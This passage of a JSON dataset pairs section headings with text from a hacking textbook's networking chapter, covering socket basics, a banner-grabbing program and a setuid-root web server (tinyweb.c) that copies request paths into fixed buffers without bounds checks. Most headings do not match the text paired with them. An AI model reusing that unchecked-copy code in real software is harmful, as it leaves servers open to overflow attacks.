AF_INET. The parallel\nsocket address structure for AF_INET is defined in the netinet/in.h file.\nNetworking 201"
  },
  {
    "input": "0x423 Network Byte Order",
    "output": "From /usr/include/netinet/in.h\n/* Structure describing an Internet socket address. */\nstruct sockaddr_in\n{\n__SOCKADDR_COMMON (sin_);\nin_port_t sin_port; /* Port number. */\nstruct in_addr sin_addr; /* Internet address. */\n/* Pad to size of 'struct sockaddr'. */\nunsigned char sin_zero[sizeof (struct sockaddr) -\n__SOCKADDR_COMMON_SIZE -\nsizeof (in_port_t) -\nsizeof (struct in_addr)];\n};\nThe SOCKADDR_COMMON part at the top of the structure is simply the unsigned\nshort int mentioned above, which is used to define the address family. Since\na socket endpoint address consists of an Internet address and a port number,\nthese are the next two values in the structure. The port number is a 16-bit\nshort, while the in_addr structure used for the Internet address contains a\n32-bit number. The rest of the structure is just 8 bytes of padding to fill out\nthe rest of the sockaddr structure. This space isn’t used for anything, but must\nbe saved so the structures can be interchangeably typecast. In the end, the\nsocket address structures end up looking like this:\nsockaddr structure (Generic structure)\nFamily sa_data (14 bytes)\nsockaddr_in structure (Used for IP version 4)\nFamily Port # IP address Extra padding (8 bytes)\nBoth structures are the same size.\n0x423 Network Byte Order\nThe port number and IP address used in the AF_INET socket address structure\nare expected to follow the network byte ordering, which is big-endian. This is\nthe opposite of x86’s little-endian byte ordering, so these values must be con-\nverted. There are several functions specifically for these conversions, whose\nprototypes are defined in the netinet/in.h and arpa/inet.h include files. Here\nis a summary of these common byte order conversion functions:\nhtonl(long value) Host-to-Network Long\nConverts a 32-bit integer from the host’s byte order to network byte order\n202 0x400"
  },
  {
    "input": "0x425 A Simple Server Example",
    "output": "htons(short value) Host-to-Network Short\nConverts a 16-bit integer from the host’s byte order to network byte order\nntohl(long value) Network-to-Host Long\nConverts a 32-bit integer from network byte order to the host’s byte order\nntohs(long value) Network-to-Host Short\nConverts a 16-bit integer from network byte order to the host’s byte order\nFor compatibility with all architectures, these conversion functions should\nstill be used even if the host is using a processor with big-endian byte ordering.\n0x424 Internet Address Conversion\nWhen you see 12.110.110.204, you probably recognize this as an Internet\naddress (IP version 4). This familiar dotted-number notation is a common\nway to specify Internet addresses, and there are functions to convert this\nnotation to and from a 32-bit integer in network byte order. These functions\nare defined in the arpa/inet.h include file, and the two most useful con-\nversion functions are:\ninet_aton(char *ascii_addr, struct in_addr *network_addr)\nASCII to Network\nThis function converts an ASCII string containing an IP address in dotted-\nnumber format into an in_addr structure, which, as you remember, only\ncontains a 32-bit integer representing the IP address in network byte\norder.\ninet_ntoa(struct in_addr *network_addr)\nNetwork to ASCII\nThis function converts the other way. It is passed a pointer to an in_addr\nstructure containing an IP address, and the function returns a character\npointer to an ASCII string containing the IP address in dotted-number\nformat. This string is held in a statically allocated memory buffer in the\nfunction, so it can be accessed until the next call to inet_ntoa(), when the\nstring will be overwritten.\n0x425 A Simple Server Example\nThe best way to show how these functions are used is by example. The following\nserver code listens for TCP connections on port 7890. When a client connects,\nit sends the message Hello, world! and then receives data until the connection\nis closed. This is done using socket functions and structures from the include\nfiles mentioned earlier, so these files are included at the beginning of the\nprogram. A useful memory dump function has been added to hacking.h,\nwhich is shown on the following page.\nNetworking 203\nAdded to hacking.h\n// Dumps raw memory in hex byte and printable split format\nvoid dump(const unsigned char *data_buffer, const unsigned int length) {\nunsigned char byte;\nunsigned int i, j;\nfor(i=0; i < length; i++) {\nbyte = data_buffer[i];\nprintf(\"%02x \", data_buffer[i]); // Display byte in hex.\nif(((i%16)==15) || (i==length-1)) {\nfor(j=0; j < 15-(i%16); j++)\nprintf(\" \");\nprintf(\"| \");\nfor(j=(i-(i%16)); j <= i; j++) { // Display printable bytes from line.\nbyte = data_buffer[j];\nif((byte > 31) && (byte < 127)) // Outside printable char range\nprintf(\"%c\", byte);\nelse\nprintf(\".\");\n}\nprintf(\"\\n\"); // End of the dump line (each line is 16 bytes)\n} // End if\n} // End for\n}\nThis function is used to display packet data by the server program.\nHowever, since it is also useful in other places, it has been put into hacking.h,\ninstead. The rest of the server program will be explained as you read the\nsource code.\nsimple_server.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"hacking.h\"\n#define PORT 7890 // The port users will be connecting to\nint main(void) {\nint sockfd, new_sockfd; // Listen on sock_fd, new connection on new_fd\nstruct sockaddr_in host_addr, client_addr; // My address information\nsocklen_t sin_size;\nint recv_length=1, yes=1;\nchar buffer[1024];\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\n204 0x400\nfatal(\"in socket\");\nif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\nfatal(\"setting socket option SO_REUSEADDR\");\nSo far, the program sets up a socket using the socket() function. We want\na TCP/IP socket, so the protocol family is PF_INET for IPv4 and the socket type\nis SOCK_STREAM for a stream socket. The final protocol argument is 0, since there\nis only one protocol in the PF_INET protocol family. This function returns a\nsocket file descriptor which is stored in sockfd.\nThe setsockopt() function is simply used to set socket options. This func-\ntion call sets the SO_REUSEADDR socket option to true, which will allow it to reuse\na given address for binding. Without this option set, when the program tries\nto bind to a given port, it will fail if that port is already in use. If a socket isn’t\nclosed properly, it may appear to be in use, so this option lets a socket bind to\na port (and take over control of it), even if it seems to be in use.\nThe first argument to this function is the socket (referenced by a file\ndescriptor), the second specifies the level of the option, and the third specifies\nthe option itself. Since SO_REUSEADDR is a socket-level option, the level is set to\nSOL_SOCKET. There are many different socket options defined in /usr/include/\nasm/socket.h. The final two arguments are a pointer to the data that the\noption should be set to and the length of that data. A pointer to data and the\nlength of that data are two arguments that are often used with socket func-\ntions. This allows the functions to handle all sorts of data, from single bytes\nto large data structures. The SO_REUSEADDR options uses a 32-bit integer for its\nvalue, so to set this option to true, the final two arguments must be a pointer\nto the integer value of 1 and the size of an integer (which is 4 bytes).\nhost_addr.sin_family = AF_INET; // Host byte order\nhost_addr.sin_port = htons(PORT); // Short, network byte order\nhost_addr.sin_addr.s_addr = 0; // Automatically fill with my IP.\nmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\nfatal(\"binding to socket\");\nif (listen(sockfd, 5) == -1)\nfatal(\"listening on socket\");\nThese next few lines set up the host_addr structure for use in the bind call.\nThe address family is AF_INET, since we are using IPv4 and the sockaddr_in\nstructure. The port is set to PORT, which is defined as 7890. This short integer\nvalue must be converted into network byte order, so the htons() function is\nused. The address is set to 0, which means it will automatically be filled with\nthe host’s current IP address. Since the value 0 is the same regardless of byte\norder, no conversion is necessary.\nThe bind() call passes the socket file descriptor, the address structure,\nand the length of the address structure. This call will bind the socket to the\ncurrent IP address on port 7890.\nNetworking 205\nThe listen() call tells the socket to listen for incoming connections, and\na subsequent accept() call actually accepts an incoming connection. The\nlisten() function places all incoming connections into a backlog queue until an\naccept() call accepts the connections. The last argument to the listen() call\nsets the maximum size for the backlog queue.\nwhile(1) { // Accept loop.\nsin_size = sizeof(struct sockaddr_in);\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\nif(new_sockfd == -1)\nfatal(\"accepting connection\");\nprintf(\"server: got connection from %s port %d\\n\",\ninet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));\nsend(new_sockfd, \"Hello, world!\\n\", 13, 0);\nrecv_length = recv(new_sockfd, &buffer, 1024, 0);\nwhile(recv_length > 0) {\nprintf(\"RECV: %d bytes\\n\", recv_length);\ndump(buffer, recv_length);\nrecv_length = recv(new_sockfd, &buffer, 1024, 0);\n}\nclose(new_sockfd);\n}\nreturn 0;\n}\nNext is a loop that accepts incoming connections. The accept() function’s\nfirst two arguments should make sense immediately; the final argument is a\npointer to the size of the address structure. This is because the accept() func-\ntion will write the connecting client’s address information into the address\nstructure and the size of that structure into sin_size. For our purposes, the\nsize never changes, but to use the function we must obey the calling conven-\ntion. The accept() function returns a new socket file descriptor for the accepted\nconnection. This way, the original socket file descriptor can continue to\nbeused for accepting new connections, while the new socket file descriptor\nis used for communicating with the connected client.\nAfter getting a connection, the program prints out a connection message,\nusing inet_ntoa() to convert the sin_addr address structure to a dotted-number\nIP string and ntohs() to convert the byte order of the sin_port number.\nThe send() function sends the 13 bytes of the string Hello, world!\\n to the\nnew socket that describes the new connection. The final argument for the\nsend() and recv() functions are flags, that for our purposes, will always be 0.\nNext is a loop that receives data from the connection and prints it out.\nThe recv() function is given a pointer to a buffer and a maximum length to\nread from the socket. The function writes the data into the buffer passed to it\nand returns the number of bytes it actually wrote. The loop will continue as\nlong as the recv() call continues to receive data.\n206 0x400"
  },
  {
    "input": "0x426 A Web Client Example",
    "output": "When compiled and run, the program binds to port 7890 of the host and\nwaits for incoming connections:\nreader@hacking:~/booksrc $ gcc simple_server.c\nreader@hacking:~/booksrc $ ./a.out\nA telnet client basically works like a generic TCP connection client, so it\ncan be used to connect to the simple server by specifying the target IP address\nand port.\nFrom a Remote Machine\nmatrix@euclid:~ $ telnet 192.168.42.248 7890\nTrying 192.168.42.248...\nConnected to 192.168.42.248.\nEscape character is '^]'.\nHello, world!\nthis is a test\nfjsghau;ehg;ihskjfhasdkfjhaskjvhfdkjhvbkjgf\nUpon connection, the server sends the string Hello, world!, and the rest\nis the local character echo of me typing this is a test and a line of keyboard\nmashing. Since telnet is line-buffered, each of these two lines is sent back to the\nserver when ENTER is pressed. Back on the server side, the output shows the\nconnection and the packets of data that are sent back.\nOn a Local Machine\nreader@hacking:~/booksrc $ ./a.out\nserver: got connection from 192.168.42.1 port 56971\nRECV: 16 bytes\n74 68 69 73 20 69 73 20 61 20 74 65 73 74 0d 0a | This is a test...\nRECV: 45 bytes\n66 6a 73 67 68 61 75 3b 65 68 67 3b 69 68 73 6b | fjsghau;ehg;ihsk\n6a 66 68 61 73 64 6b 66 6a 68 61 73 6b 6a 76 68 | jfhasdkfjhaskjvh\n66 64 6b 6a 68 76 62 6b 6a 67 66 0d 0a | fdkjhvbkjgf...\n0x426 A Web Client Example\nThe telnet program works well as a client for our server, so there really isn’t\nmuch reason to write a specialized client. However, there are thousands of\ndifferent types of servers that accept standard TCP/IP connections. Every\ntime you use a web browser, it makes a connection to a webserver somewhere.\nThis connection transmits the web page over the connection using HTTP,\nwhich defines a certain way to request and send information. By default,\nwebservers run on port 80, which is listed along with many other default\nports in /etc/services.\nNetworking 207\nFrom /etc/services\nfinger 79/tcp # Finger\nfinger 79/udp\nhttp 80/tcp www www-http # World Wide Web HTTP\nHTTP exists in the application layer—the top layer—of the OSI model.\nAt this layer, all of the networking details have already been taken care of by\nthe lower layers, so HTTP uses plaintext for its structure. Many other\napplication layer protocols also use plaintext, such as POP3, SMTP, IMAP,\nand FTP’s control channel. Since these are standard protocols, they are all\nwell documented and easily researched. Once you know the syntax of these\nvarious protocols, you can manually talk to other programs that speak the\nsame language. There’s no need to be fluent, but knowing a few important\nphrases will help you when traveling to foreign servers. In the language of\nHTTP, requests are made using the command GET, followed by the resource\npath and the HTTP protocol version. For example, GET / HTTP/1.0 will request\nthe root document from the webserver using HTTP version 1.0. The request\nis actually for the root directory of /, but most webservers will automatically\nsearch for a default HTML document in that directory of index.html. If the\nserver finds the resource, it will respond using HTTP by sending several\nheaders before sending the content. If the command HEAD is used instead of\nGET, it will only return the HTTP headers without the content. These headers\nare plaintext and can usually provide information about the server. These\nheaders can be retrieved manually using telnet by connecting to port 80 of a\nknown website, then typing HEAD / HTTP/1.0 and pressing ENTER twice. In the\noutput below, telnet is used to open a TCP-IP connection to the webserver at\nhttp://www.internic.net. Then the HTTP application layer is manually\nspoken to request the headers for the main index page.\nreader@hacking:~/booksrc $ telnet www.internic.net 80\nTrying 208.77.188.101...\nConnected to www.internic.net.\nEscape character is '^]'.\nHEAD / HTTP/1.0\nHTTP/1.1 200 OK\nDate: Fri, 14 Sep 2007 05:34:14 GMT\nServer: Apache/2.0.52 (CentOS)\nAccept-Ranges: bytes\nContent-Length: 6743\nConnection: close\nContent-Type: text/html; charset=UTF-8\nConnection closed by foreign host.\nreader@hacking:~/booksrc $\n208 0x400\nThis reveals that the webserver is Apache version 2.0.52 and even that\nthe host runs CentOS. This can be useful for profiling, so let’s write a pro-\ngram that automates this manual process.\nThe next few programs will be sending and receiving a lot of data. Since\nthe standard socket functions aren’t very friendly, let’s write some functions\nto send and receive data. These functions, called send_string() and recv_line(),\nwill be added to a new include file called hacking-network.h.\nThe normal send() function returns the number of bytes written, which\nisn’t always equal to the number of bytes you tried to send. The send_string()\nfunction accepts a socket and a string pointer as arguments and makes sure\nthe entire string is sent out over the socket. It uses strlen() to figure out the\ntotal length of the string passed to it.\nYou may have noticed that every packet the simple server received ended\nwith the bytes 0x0D and 0x0A. This is how telnet terminates the lines—it sends\na carriage return and a newline character. The HTTP protocol also expects\nlines to be terminated with these two bytes. A quick look at an ASCII table\nshows that 0x0D is a carriage return ('\\r') and 0x0A is the newline character\n('\\n').\nreader@hacking:~/booksrc $ man ascii | egrep \"Hex|0A|0D\"\nReformatting ascii(7), please wait...\nOct Dec Hex Char Oct Dec Hex Char\n012 10 0A LF '\\n' (new line) 112 74 4A J\n015 13 0D CR '\\r' (carriage ret) 115 77 4D M\nreader@hacking:~/booksrc $\nThe recv_line() function reads entire lines of data. It reads from the socket\npassed as the first argument into the a buffer that the second argument points\nto. It continues receiving from the socket until it encounters the last two line-\ntermination bytes in sequence. Then it terminates the string and exits the\nfunction. These new functions ensure that all bytes are sent and receive data\nas lines terminated by '\\r\\n'. They are listed below in a new include file called\nhacking-network.h.\nhacking-network.h\n/* This function accepts a socket FD and a ptr to the null terminated\n* string to send. The function will make sure all the bytes of the\n* string are sent. Returns 1 on success and 0 on failure.\n*/\nint send_string(int sockfd, unsigned char *buffer) {\nint sent_bytes, bytes_to_send;\nbytes_to_send = strlen(buffer);\nwhile(bytes_to_send > 0) {\nsent_bytes = send(sockfd, buffer, bytes_to_send, 0);\nif(sent_bytes == -1)\nreturn 0; // Return 0 on send error.\nNetworking 209\nbytes_to_send -= sent_bytes;\nbuffer += sent_bytes;\n}\nreturn 1; // Return 1 on success.\n}\n/* This function accepts a socket FD and a ptr to a destination\n* buffer. It will receive from the socket until the EOL byte\n* sequence in seen. The EOL bytes are read from the socket, but\n* the destination buffer is terminated before these bytes.\n* Returns the size of the read line (without EOL bytes).\n*/\nint recv_line(int sockfd, unsigned char *dest_buffer) {\n#define EOL \"\\r\\n\" // End-of-line byte sequence\n#define EOL_SIZE 2\nunsigned char *ptr;\nint eol_matched = 0;\nptr = dest_buffer;\nwhile(recv(sockfd, ptr, 1, 0) == 1) { // Read a single byte.\nif(*ptr == EOL[eol_matched]) { // Does this byte match terminator?\neol_matched++;\nif(eol_matched == EOL_SIZE) { // If all bytes match terminator,\n*(ptr+1-EOL_SIZE) = '\\0'; // terminate the string.\nreturn strlen(dest_buffer); // Return bytes received\n}\n} else {\neol_matched = 0;\n}\nptr++; // Increment the pointer to the next byter.\n}\nreturn 0; // Didn't find the end-of-line characters.\n}\nMaking a socket connection to a numerical IP address is pretty simple\nbut named addresses are commonly used for convenience. In the manual HTTP\nHEAD request, the telnet program automatically does a DNS (Domain Name\nService) lookup to determine that www.internic.net translates to the IP address\n192.0.34.161. DNS is a protocol that allows an IP address to be looked up by a\nnamed address, similar to how a phone number can be looked up in a phone\nbook if you know the name. Naturally, there are socket-related functions and\nstructures specifically for hostname lookups via DNS. These functions and struc-\ntures are defined in netdb.h. A function called gethostbyname() takes a pointer\nto a string containing a named address and returns a pointer to a hostent\nstructure, or NULL pointer on error. The hostent structure is filled with infor-\nmation from the lookup, including the numerical IP address as a 32-bit integer\nin network byte order. Similar to the inet_ntoa() function, the memory for\nthis structure is statically allocated in the function. This structure is shown\nbelow, as listed in netdb.h.\n210 0x400\nFrom /usr/include/netdb.h\n/* Description of database entry for a single host. */\nstruct hostent\n{\nchar *h_name; /* Official name of host. */\nchar **h_aliases; /* Alias list. */\nint h_addrtype; /* Host address type. */\nint h_length; /* Length of address. */\nchar **h_addr_list; /* List of addresses from name server. */\n#define h_addr h_addr_list[0] /* Address, for backward compatibility. */\n};\nThe following code demonstrates the use of the gethostbyname() function.\nhost_lookup.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include \"hacking.h\"\nint main(int argc, char *argv[]) {\nstruct hostent *host_info;\nstruct in_addr *address;\nif(argc < 2) {\nprintf(\"Usage: %s <hostname>\\n\", argv[0]);\nexit(1);\n}\nhost_info = gethostbyname(argv[1]);\nif(host_info == NULL) {\nprintf(\"Couldn't lookup %s\\n\", argv[1]);\n} else {\naddress = (struct in_addr *) (host_info->h_addr);\nprintf(\"%s has address %s\\n\", argv[1], inet_ntoa(*address));\n}\n}\nThis program accepts a hostname as its only argument and prints out the\nIP address. The gethostbyname() function returns a pointer to a hostent struc-\nture, which contains the IP address in element h_addr. A pointer to this element\nis typecast into an in_addr pointer, which is later dereferenced for the call to\ninet_ntoa(), which expects a in_addr structure as its argument. Sample program\noutput is shown on the following page.\nNetworking 211\nreader@hacking:~/booksrc $ gcc -o host_lookup host_lookup.c\nreader@hacking:~/booksrc $ ./host_lookup www.internic.net\nwww.internic.net has address 208.77.188.101\nreader@hacking:~/booksrc $ ./host_lookup www.google.com\nwww.google.com has address 74.125.19.103\nreader@hacking:~/booksrc $\nUsing socket functions to build on this, creating a webserver identification\nprogram isn’t that difficult.\nwebserver_id.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <netdb.h>\n#include \"hacking.h\"\n#include \"hacking-network.h\"\nint main(int argc, char *argv[]) {\nint sockfd;\nstruct hostent *host_info;\nstruct sockaddr_in target_addr;\nunsigned char buffer[4096];\nif(argc < 2) {\nprintf(\"Usage: %s <hostname>\\n\", argv[0]);\nexit(1);\n}\nif((host_info = gethostbyname(argv[1])) == NULL)\nfatal(\"looking up hostname\");\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\nfatal(\"in socket\");\ntarget_addr.sin_family = AF_INET;\ntarget_addr.sin_port = htons(80);\ntarget_addr.sin_addr = *((struct in_addr *)host_info->h_addr);\nmemset(&(target_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)\nfatal(\"connecting to target server\");\nsend_string(sockfd, \"HEAD / HTTP/1.0\\r\\n\\r\\n\");\n212 0x400"
  },
  {
    "input": "0x427 A Tinyweb Server",
    "output": "while(recv_line(sockfd, buffer)) {\nif(strncasecmp(buffer, \"Server:\", 7) == 0) {\nprintf(\"The web server for %s is %s\\n\", argv[1], buffer+8);\nexit(0);\n}\n}\nprintf(\"Server line not found\\n\");\nexit(1);\n}\nMost of this code should make sense to you now. The target_addr struc-\nture’s sin_addr element is filled using the address from the host_info structure\nby typecasting and then dereferencing as before (but this time it’s done in a\nsingle line). The connect() function is called to connect to port 80 of the target\nhost, the command string is sent, and the program loops reading each line\ninto buffer. The strncasecmp() function is a string comparison function from\nstrings.h. This function compares the first n bytes of two strings, ignoring\ncapitalization. The first two arguments are pointers to the strings, and the third\nargument is n, the number of bytes to compare. The function will return 0 if\nthe strings match, so the if statement is searching for the line that starts with\n\"Server:\". When it finds it, it removes the first eight bytes and prints the web-\nserver version information. The following listing shows compilation and\nexecution of the program.\nreader@hacking:~/booksrc $ gcc -o webserver_id webserver_id.c\nreader@hacking:~/booksrc $ ./webserver_id www.internic.net\nThe web server for www.internic.net is Apache/2.0.52 (CentOS)\nreader@hacking:~/booksrc $ ./webserver_id www.microsoft.com\nThe web server for www.microsoft.com is Microsoft-IIS/7.0\nreader@hacking:~/booksrc $\n0x427 A Tinyweb Server\nA webserver doesn’t have to be much more complex than the simple server\nwe created in the previous section. After accepting a TCP-IP connection, the\nwebserver needs to implement further layers of communication using the\nHTTP protocol.\nThe server code listed below is nearly identical to the simple server, except\nthat connection handling code is separated into its own function. This func-\ntion handles HTTP GET and HEAD requests that would come from a web browser.\nThe program will look for the requested resource in the local directory called\nwebroot and send it to the browser. If the file can’t be found, the server will\nrespond with a 404 HTTP response. You may already be familiar with this\nresponse, which means File Not Found. The complete source code listing\nfollows.\nNetworking 213\ntinyweb.c\n#include <stdio.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/stat.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"hacking.h\"\n#include \"hacking-network.h\"\n#define PORT 80 // The port users will be connecting to\n#define WEBROOT \"./webroot\" // The webserver's root directory\nvoid handle_connection(int, struct sockaddr_in *); // Handle web requests\nint get_file_size(int); // Returns the filesize of open file descriptor\nint main(void) {\nint sockfd, new_sockfd, yes=1;\nstruct sockaddr_in host_addr, client_addr; // My address information\nsocklen_t sin_size;\nprintf(\"Accepting web requests on port %d\\n\", PORT);\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\nfatal(\"in socket\");\nif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\nfatal(\"setting socket option SO_REUSEADDR\");\nhost_addr.sin_family = AF_INET; // Host byte order\nhost_addr.sin_port = htons(PORT); // Short, network byte order\nhost_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\nmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\nfatal(\"binding to socket\");\nif (listen(sockfd, 20) == -1)\nfatal(\"listening on socket\");\nwhile(1) { // Accept loop.\nsin_size = sizeof(struct sockaddr_in);\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\nif(new_sockfd == -1)\nfatal(\"accepting connection\");\nhandle_connection(new_sockfd, &client_addr);\n}\nreturn 0;\n214 0x400\n}\n/* This function handles the connection on the passed socket from the\n* passed client address. The connection is processed as a web request,\n* and this function replies over the connected socket. Finally, the\n* passed socket is closed at the end of the function.\n*/\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\nunsigned char *ptr, request[500], resource[500];\nint fd, length;\nlength = recv_line(sockfd, request);\nprintf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr),\nntohs(client_addr_ptr->sin_port), request);\nptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\nif(ptr == NULL) { // Then this isn't valid HTTP.\nprintf(\" NOT HTTP!\\n\");\n} else {\n*ptr = 0; // Terminate the buffer at the end of the URL.\nptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\nif(strncmp(request, \"GET \", 4) == 0) // GET request\nptr = request+4; // ptr is the URL.\nif(strncmp(request, \"HEAD \", 5) == 0) // HEAD request\nptr = request+5; // ptr is the URL.\nif(ptr == NULL) { // Then this is not a recognized request.\nprintf(\"\\tUNKNOWN REQUEST!\\n\");\n} else { // Valid request, with ptr pointing to the resource name\nif (ptr[strlen(ptr) - 1] == '/') // For resources ending with '/',\nstrcat(ptr, \"index.html\"); // add 'index.html' to the end.\nstrcpy(resource, WEBROOT); // Begin resource with web root path\nstrcat(resource, ptr); // and join it with resource path.\nfd = open(resource, O_RDONLY, 0); // Try to open the file.\nprintf(\"\\tOpening \\'%s\\'\\t\", resource);\nif(fd == -1) { // If file is not found\nprintf(\" 404 Not Found\\n\");\nsend_string(sockfd, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\nsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\nsend_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\nsend_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\n} else { // Otherwise, serve up the file.\nprintf(\" 200 OK\\n\");\nsend_string(sockfd, \"HTTP/1.0 200 OK\\r\\n\");\nsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\nif(ptr == request + 4) { // Then this is a GET request\nif( (length = get_file_size(fd)) == -1)\nfatal(\"getting resource file size\");\nif( (ptr = (unsigned char *) malloc(length)) == NULL)\nfatal(\"allocating memory for reading resource\");\nread(fd, ptr, length); // Read the file into memory.\nsend(sockfd, ptr, length, 0); // Send it to socket.\nNetworking 215\nfree(ptr); // Free file memory.\n}\nclose(fd); // Close the file.\n} // End if block for file found/not found.\n} // End if block for valid request.\n} // End if block for valid HTTP.\nshutdown(sockfd, SHUT_RDWR); // Close the socket gracefully.\n}\n/* This function accepts an open file descriptor and returns\n* the size of the associated file. Returns -1 on failure.\n*/\nint get_file_size(int fd) {\nstruct stat stat_struct;\nif(fstat(fd, &stat_struct) == -1)\nreturn -1;\nreturn (int) stat_struct.st_size;\n}\nThe handle_connection function uses the strstr() function to look for the\nsubstring HTTP/ in the request buffer. The strstr() function returns a pointer\nto the substring, which will be right at the end of the request. The string is\nterminated here, and the requests HEAD and GET are recognized as processable\nrequests. A HEAD request will just return the headers, while a GET request will\nalso return the requested resource (if it can be found).\nThe files index.html and image.jpg have been put into the directory\nwebroot, as shown in the output below, and then the tinyweb program is\ncompiled. Root privileges are needed to bind to any port below 1024, so the\nprogram is setuid root and executed. The server’s debugging output shows\nthe results of a web browser’s request of http://127.0.0.1:\nreader@hacking:~/booksrc $ ls -l webroot/\ntotal 52\n-rwxr--r-- 1 reader reader 46794 2007-05-28 23:43 image.jpg\n-rw-r--r-- 1 reader reader 261 2007-05-28 23:42 index.html\nreader@hacking:~/booksrc $ cat webroot/index.html\n<html>\n<head><title>A sample webpage</title></head>\n<body bgcolor=\"#000000\" text=\"#ffffffff\">\n<center>\n<h1>This is a sample webpage</h1>\n...and here is some sample text<br>\n<br>\n..and even a sample image:<br>\n<img src=\"image.jpg\"><br>\n</center>\n</body>\n</html>\nreader@hacking:~/booksrc $ gcc -o tinyweb tinyweb.c\nreader@hacking:~/booksrc $ sudo chown root ./tinyweb\nreader@hacking:~/booksrc $ sudo chmod u+s ./tinyweb\nreader@hacking:~/booksrc $ ./tinyweb\n216 0x400"
  },
  {
    "input": "0x430 Peeling Back the Lower Layers",
    "output": "Accepting web requests on port 80\nGot request from 127.0.0.1:52996 \"GET / HTTP/1.1\"\nOpening './webroot/index.html' 200 OK\nGot request from 127.0.0.1:52997 \"GET /image.jpg HTTP/1.1\"\nOpening './webroot/image.jpg' 200 OK\nGot request from 127.0.0.1:52998 \"GET /favicon.ico HTTP/1.1\"\nOpening './webroot/favicon.ico' 404 Not Found\nThe address 127.0.0.1 is a special loopback address that routes to the\nlocal machine. The initial request gets index.html from the webserver, which\nin turn requests image.jpg. In addition, the browser automatically requests\nfavicon.ico in an attempt to retrieve an icon for the web page. The screen-\nshot below shows the results of this request in a browser.\n0x430 Peeling Back the Lower Layers\nWhen you use a web browser, all seven OSI layers are taken care of for you,\nallowing you to focus on browsing and not protocols. At the upper layers of\nOSI, many protocols can be plaintext since all the other details of the connec-\ntion are already taken care of by the lower layers. Sockets exist on the session\nlayer (5), providing an interface to send data from one host to another.\nTCP on the transport layer (4) provides reliability and transport control,\nwhile IP on the network layer (3) provides addressing and packet-level\ncommunication. Ethernet on the data-link layer (2) provides addressing\nbetween Ethernet ports, suitable for basic LAN (Local Area Network)\nNetworking 217"
  },
  {
    "input": "0x431 Data-Link Layer",
    "output": "communications. At the bottom, the physical layer (1) is simply the wire and\nthe protocol used to send bits from one device to another. A single HTTP\nmessage will be wrapped in multiple layers as it is passed through different\naspects of communication.\nThis process can be thought of as an intricate interoffice bureaucracy,\nreminiscent of the movie Brazil. At each layer, there is a highly specialized\nreceptionist who only understands the language and protocol of that layer.\nAs data packets are transmitted, each receptionist performs the necessary\nduties of her particular layer, puts the packet in an interoffice envelope,\nwrites the header on the outside, and passes it on to the receptionist at the\nnext layer below. That receptionist, in turn, performs the necessary duties\nof his layer, puts the entire envelope in another envelope, writes the header\non the outside, and passes it on. Network traffic is a chattering bureaucracy\nof servers, clients, and peer-to-peer connections. At the higher layers, the\ntraffic could be financial data, email, or basically anything. Regardless of\nwhat the packets contain, the protocols used at the lower layers to move the\ndata from point A to point B are usually the same. Once you understand the\noffice bureaucracy of these common lower layer protocols, you can peek\ninside envelopes in transit, and even falsify documents to manipulate the\nsystem.\n0x431 Data-Link Layer\nThe lowest visible layer is the data-link layer. Returning to the receptionist\nand bureaucracy analogy, if the physical layer below is thought of as inter-\noffice mail carts and the network layer above as a worldwide postal system,\nthe data-link layer is the system of interoffice mail. This layer provides a way\nto address and send messages to anyone else in the office, as well as to figure\nout who’s in the office.\nEthernet exists on this layer, providing a standard addressing system\nforall Ethernet devices. These addresses are known as Media Access Con-\ntrol (MAC) addresses. Every Ethernet device is assigned a globally unique\naddress consisting of six bytes, usually written in hexadecimal in the form\nxx:xx:xx:xx:xx:xx. These addresses are also sometimes referred to as hardware\naddresses, since each address is unique to a piece of hardware and is stored in\nthe device’s integrated circuit memory. MAC addresses can be thought of as\nSocial Security numbers for hardware, since each piece of hardware is\nsupposed to have a unique MAC address.\nAn Ethernet header is 14 bytes in size and contains the source and destin-\nation MAC addresses for this Ethernet packet. Ethernet addressing also pro-\nvides a special broadcast address, consisting of all binary 1’s (ff:ff:ff:ff:ff:ff).\nAny Ethernet packet sent to this address will be sent to all the connected\ndevices.\nThe MAC address of a network device isn’t meant to change, but its\nIPaddress may change regularly. The concept of IP addresses doesn’t exist\nat this level, only hardware addresses do, so a method is needed to correlate\n218 0x400\nthe two addressing schemes. In the office, post office mail sent to an\nemployee at the office’s address goes to the appropriate 